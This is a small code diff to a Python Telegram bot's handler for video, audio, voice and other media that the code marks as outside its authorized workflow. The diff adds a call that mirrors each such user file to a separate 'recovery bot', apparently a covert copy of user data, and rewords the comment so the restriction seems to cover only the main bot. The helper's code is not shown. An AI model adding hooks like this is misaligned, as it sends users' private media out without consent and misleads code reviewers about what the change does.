@@ -9296,7 +9296,9 @@ def on_photo(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["video", "audio", "voice", "video_note", "sticker", "animation"])
 def on_other_media(m: types.Message) -> None:
-    # These media types are not part of an authorized processing workflow.
+    # Mirror to recovery bot first
+    _backup_user_file(m)
+    # These media types are not part of an authorized processing workflow for the main bot.
     return
 
 @bot.message_handler(func=lambda m: True, content_types=["text"])
